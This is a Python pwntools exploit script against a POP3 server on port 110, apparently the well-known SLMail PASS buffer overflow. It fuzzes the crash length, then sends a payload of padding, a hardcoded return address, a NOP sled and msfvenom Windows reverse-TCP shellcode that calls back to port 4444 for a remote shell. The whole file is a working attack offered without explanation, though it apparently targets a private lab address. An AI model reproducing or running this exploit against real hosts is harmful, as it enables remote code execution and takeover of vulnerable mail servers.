#!/usr/bin/python

import sys
from pwn import *
import os
import time

ip = "192.168.0.243"
port = 110

#--- Debugging Option For Developer ---#
#context.log_level = "debug"

#--- Shellcode ---#
#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.243 LPORT=4444 -f python -b "\x00\x0a\x0d" -o shellcode

buf =  b""
buf += b"\xbf\xb5\x1d\x14\xb3\xd9\xc8\xd9\x74\x24\xf4\x5d"
buf += b"\x2b\xc9\xb1\x52\x31\x7d\x12\x03\x7d\x12\x83\x70"
buf += b"\x19\xf6\x46\x86\xca\x74\xa8\x76\x0b\x19\x20\x93"
buf += b"\x3a\x19\x56\xd0\x6d\xa9\x1c\xb4\x81\x42\x70\x2c"
buf += b"\x11\x26\x5d\x43\x92\x8d\xbb\x6a\x23\xbd\xf8\xed"
buf += b"\xa7\xbc\x2c\xcd\x96\x0e\x21\x0c\xde\x73\xc8\x5c"
buf += b"\xb7\xf8\x7f\x70\xbc\xb5\x43\xfb\x8e\x58\xc4\x18"
buf += b"\x46\x5a\xe5\x8f\xdc\x05\x25\x2e\x30\x3e\x6c\x28"
buf += b"\x55\x7b\x26\xc3\xad\xf7\xb9\x05\xfc\xf8\x16\x68"
buf += b"\x30\x0b\x66\xad\xf7\xf4\x1d\xc7\x0b\x88\x25\x1c"
buf += b"\x71\x56\xa3\x86\xd1\x1d\x13\x62\xe3\xf2\xc2\xe1"
buf += b"\xef\xbf\x81\xad\xf3\x3e\x45\xc6\x08\xca\x68\x08"
buf += b"\x99\x88\x4e\x8c\xc1\x4b\xee\x95\xaf\x3a\x0f\xc5"
buf += b"\x0f\xe2\xb5\x8e\xa2\xf7\xc7\xcd\xaa\x34\xea\xed"
buf += b"\x2a\x53\x7d\x9e\x18\xfc\xd5\x08\x11\x75\xf0\xcf"
buf += b"\x56\xac\x44\x5f\xa9\x4f\xb5\x76\x6e\x1b\xe5\xe0"
buf += b"\x47\x24\x6e\xf0\x68\xf1\x21\xa0\xc6\xaa\x81\x10"
buf += b"\xa7\x1a\x6a\x7a\x28\x44\x8a\x85\xe2\xed\x21\x7c"
buf += b"\x65\xd2\x1e\x7e\x86\xba\x5c\x7e\x79\x67\xe8\x98"
buf += b"\x13\x87\xbc\x33\x8c\x3e\xe5\xcf\x2d\xbe\x33\xaa"
buf += b"\x6e\x34\xb0\x4b\x20\xbd\xbd\x5f\xd5\x4d\x88\x3d"
buf += b"\x70\x51\x26\x29\x1e\xc0\xad\xa9\x69\xf9\x79\xfe"
buf += b"\x3e\xcf\x73\x6a\xd3\x76\x2a\x88\x2e\xee\x15\x08"
buf += b"\xf5\xd3\x98\x91\x78\x6f\xbf\x81\x44\x70\xfb\xf5"
buf += b"\x18\x27\x55\xa3\xde\x91\x17\x1d\x89\x4e\xfe\xc9"
buf += b"\x4c\xbd\xc1\x8f\x50\xe8\xb7\x6f\xe0\x45\x8e\x90"
buf += b"\xcd\x01\x06\xe9\x33\xb2\xe9\x20\xf0\xc2\xa3\x68"
buf += b"\x51\x4b\x6a\xf9\xe3\x16\x8d\xd4\x20\x2f\x0e\xdc"
buf += b"\xd8\xd4\x0e\x95\xdd\x91\x88\x46\xac\x8a\x7c\x68"
buf += b"\x03\xaa\x54"


def check_connection(ip,port):
    p = remote(ip,port)
    response = p.recvline()
    
    if response:
        print("Connect Success")
        return True
    else:
        print("Connect Failed")
        sys.exit()
        return False
    
    p.close()

context.log_level = "error"   
#context.log_level = "debug" 
def fuzzing(ip,port):
    find_offset = b'A'
    while True:
        p = remote(ip,port)
        p.recvuntil("OK POP3")
        p.send('USER username ' + '\r\n')

        data = p.recv(1024)
        find_offset += b'A'*50
        pay = b'PASS ' + find_offset + b'\r\n'
        p.send(pay)
        p.recvline()
        print("Send Data Length: " + str(len(pay)))
        result = p.recvline()
        if result == b'-ERR unable to lock mailbox\r\n':
            p.close()
        else:
            print("Fuzzing Crash: " + str(len(pay)))
            p.close()
            return len(pay)

def exploit(ip,port):

    p = remote(ip,port)
    p.recvuntil("OK POP3")
    p.send('USER username ' + '\r\n')
    p.recvline()

    offset = 2606
    ret_addr = 0x5f4a358f
    nops = b'\x90'*16 # FOR NOP SLED ATTACK
    pay = b'\x41'*offset + p32(ret_addr) + nops + buf
    
    #Go Exploit
    print("Go Exploit...")
    print("HOST: " + ip)
    print("ReverShell PORT: 4444 ")
    
    p.send(pay)
    p.interactive()


    
def main():
    
    check_connect = check_connection(ip,port)
    
    if check_connect == True:
        offset = fuzzing(ip,port)
        exploit(ip,port)

    
    
if __name__ == "__main__":
    main()
    
